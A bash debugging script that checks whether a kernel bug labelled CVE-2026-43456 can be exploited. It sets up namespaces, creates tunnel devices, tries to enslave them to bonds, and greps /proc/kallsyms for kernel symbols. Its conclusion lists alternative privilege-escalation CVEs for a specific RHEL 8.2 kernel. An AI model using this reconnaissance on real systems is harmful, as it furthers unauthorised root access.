#!/bin/bash
# CVE-2026-43456 debug — verbose, shows actual errors, tries both GRE types
# Run: bash cve43456_debug.sh
echo "=== CVE-2026-43456 DEBUG ==="
echo "kernel: $(uname -r)"
echo ""

check_ns() {
    v=$(cat /proc/sys/user/max_user_namespaces 2>/dev/null || echo 0)
    [ "$v" -gt 0 ] && echo "[+] user_namespaces = $v" || { echo "[-] disabled"; exit 1; }
}
check_ns

echo "[*] entering net namespace..."
unshare -Urn -- bash -s <<'NS'

echo "[+] uid=$(id -u) inside namespace"
ip link set lo up 2>/dev/null

# ─── helper ───
try_enslave() {
    local slave="$1" master="$2"
    echo ""
    echo "─── try: ip link set $slave master $master ───"
    ip link show "$slave" 2>&1 | head -2
    ip link show "$master" 2>&1 | head -2
    # show ACTUAL error
    result=$(ip link set "$slave" master "$master" 2>&1)
    rc=$?
    if [ $rc -eq 0 ]; then
        echo "[+] SUCCESS! $slave enslaved to $master"
        return 0
    else
        echo "[-] FAIL (rc=$rc): $result"
        return 1
    fi
}

cleanup() {
    for d in bond0 bond1 ip6gre0 ip6gre1 gre0 gre1 dummy0 sit0; do
        ip link del "$d" 2>/dev/null || true
    done
}
# don't cleanup pre-existing, just check
echo ""
echo "=== pre-existing devices ==="
ip link show 2>/dev/null | grep -E '^[0-9]+:' | awk '{print $2}' | tr -d ':'
echo ""

# ─── Setup IPv4 subnet on dummy0 ───
echo "=== Setup dummy0 ==="
ip link add dummy9 type dummy 2>&1
ip link set dummy9 up
ip addr add 192.168.10.1/24 dev dummy9
ip -6 addr add fd00::1/64 dev dummy9
ip -6 route add fd00::2/128 dev dummy9 2>/dev/null
echo "dummy9: $(ip addr show dummy9 2>/dev/null | grep -E 'inet|inet6' | awk '{print $2}' | tr '\n' ' ')"

echo ""
echo "=== TEST A: ip6gre + bond (IPv6 GRE) ==="
# Use unique names to avoid conflict with auto-created devices
ip link add ip6gre9 type ip6gre local fd00::1 remote fd00::2 2>&1
echo "ip6gre9 type: $(cat /sys/class/net/ip6gre9/type 2>/dev/null || echo 'n/a')"
echo "ip6gre9 flags: $(ip link show ip6gre9 2>/dev/null | head -1)"

ip link add bond9 type bond mode active-backup 2>&1
ip link set bond9 up 2>&1

try_enslave ip6gre9 bond9 || echo "  → ip6gre ARPHRD might be rejected by bond"

echo ""
echo "=== TEST B: gre (IPv4 GRE) + bond ==="
ip link add dummy_gre type dummy 2>/dev/null
ip addr add 10.5.5.1/24 dev dummy_gre 2>/dev/null
ip link set dummy_gre up 2>/dev/null

ip link add gre9 type gre local 10.5.5.1 remote 10.5.5.2 2>&1
echo "gre9 type: $(cat /sys/class/net/gre9/type 2>/dev/null || echo 'n/a')"

ip link add bond8 type bond mode active-backup 2>&1
ip link set bond8 up 2>&1

try_enslave gre9 bond8 || echo "  → IPv4 gre also rejected"

echo ""
echo "=== TEST C: sit (IPv6-in-IPv4) + bond ==="
ip link add sit9 type sit local 10.5.5.1 remote 10.5.5.2 2>&1
echo "sit9 type: $(cat /sys/class/net/sit9/type 2>/dev/null || echo 'n/a')"

ip link add bond7 type bond mode active-backup 2>&1
ip link set bond7 up 2>&1

try_enslave sit9 bond7 || echo "  → sit also rejected"

echo ""
echo "=== TEST D: veth + bond ==="
ip link add veth9a type veth peer name veth9b 2>&1
ip link set veth9a up; ip link set veth9b up

ip link add bond6 type bond mode active-backup 2>&1
ip link set bond6 up 2>&1

try_enslave veth9a bond6 && echo "  [veth works as expected]"

echo ""
echo "=== Device types (ARPHRD) ==="
for d in ip6gre9 gre9 sit9 veth9a bond9; do
    t=$(cat /sys/class/net/$d/type 2>/dev/null || echo 'n/a')
    echo "  $d type=$t"
done

echo ""
echo "=== bonding: which slave types accepted? ==="
# Check bond source hints
echo "  bond active-backup accepts ARPHRD_ETHER=1, ARPHRD_INFINIBAND=32"
echo "  ip6gre ARPHRD_IP6GRE=823 (0x337)"
echo "  gre    ARPHRD_IPGRE=778  (0x30A)"
echo "  sit    ARPHRD_SIT=776    (0x308)"

echo ""
echo "=== kallsyms check ==="
kptr=$(cat /proc/sys/kernel/kptr_restrict 2>/dev/null)
echo "kptr_restrict=$kptr"
grep 'bond_rcv_validate\|_text\b\|startup_64' /proc/kallsyms 2>/dev/null | head -5

echo ""
echo "=== CONCLUSION ==="
# Check which test passed
if ip link show 2>/dev/null | grep -q 'master bond9'; then
    echo "[+] ip6gre → bond WORKS → CVE-2026-43456 exploitable via ip6gre"
elif ip link show 2>/dev/null | grep -q 'master bond8'; then
    echo "[+] IPv4 gre → bond WORKS → ipgre_header type confusion exploitable"
elif ip link show 2>/dev/null | grep -q 'master bond7'; then
    echo "[+] sit → bond WORKS → tunnel type confusion possible"
else
    echo "[-] ALL GRE/tunnel types rejected by bonding"
    echo "    → bonding in this kernel has strict ARPHRD check"
    echo "    → CVE-2026-43456 via bond NOT exploitable without patching bond or using different tunnel"
    echo ""
    echo "[*] Alternative LPE paths for 4.18.0-193.el8_2:"
    echo "    1. CVE-2021-22555 (net/netfilter/x_tables.c heap OOB)"
    echo "    2. CVE-2021-33909 (sequoia — size_t overflow in seq_buf)"
    echo "    3. CVE-2022-0847 (dirty pipe — 5.8+, NOT applicable here)"
    echo "    4. DirtyCOW variant check: $(uname -r)"
fi

NS
